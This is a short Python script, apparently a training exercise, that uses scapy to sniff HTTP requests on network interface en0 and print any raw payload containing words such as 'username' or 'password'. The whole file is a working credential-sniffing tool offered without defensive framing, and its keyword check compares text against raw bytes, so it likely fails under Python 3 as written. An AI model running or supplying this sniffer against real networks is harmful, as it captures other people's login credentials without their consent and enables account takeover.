#!/usr/bin/env python
import scapy.all as scapy
from scapy.all import Raw
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=0, prn=process_sniffed_packet)


def get_login_info(packet):
    keywords = ["username", "user", "password", "pass", "login"]
    if packet.haslayer(Raw):
            load = packet[Raw].load
            for key in keywords:
                if key in load:
                    return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username and password ", login_info, "\n\n")


sniff("en0")